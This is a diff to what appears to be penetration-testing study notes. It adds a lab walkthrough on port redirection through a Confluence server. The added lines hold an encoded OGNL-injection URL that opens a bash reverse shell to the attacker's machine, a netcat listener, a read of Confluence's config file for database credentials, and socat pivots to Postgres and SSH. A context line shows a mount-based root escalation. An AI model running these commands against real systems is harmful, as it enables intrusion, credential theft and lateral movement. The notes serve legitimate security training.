@@ -2650,6 +2650,25 @@ Reference
     - Exploit mount > euid=0(root)  
       `mount -o bind /bin/sh /bin/mount` `id`  
 
+### Port redirection and SSH Tunneling  
+- Port forward with linux tools (Kali > confluence > db)  
+  - nmap scan open ports on CONFLUENCE01 > 22, 80, 8090
+  - set netcat listener + gain reverse shell to confluence server)  
+    `nc -nvlp 4444`  
+    `curl http://<CONFLUENCE01>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<KALI>/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
+  - get credentials on atlassian to access DB  
+    `cat /var/atlassian/application-data/confluence/confluence.cfg.xml`  
+  - open port 2345 (from confluence to DB)  
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.124.215:5432`  
+  - connect to DB through port forward 2345  
+    `psql -h 192.168.124.63 -p 2345 -U postgres`  
+  - open port 2222 (from confluence to DB)  
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`
+  - connect to DB through port forward 2222  
+    `ssh database_admin@192.168.124.63 -p2222`  
+- SSH Tunneling
+- Port forward with window tools  
+
 ## Penetration testing report 
 - note editor:
   - [Sublime-syntax highlight](https://www.sublimetext.com/download)
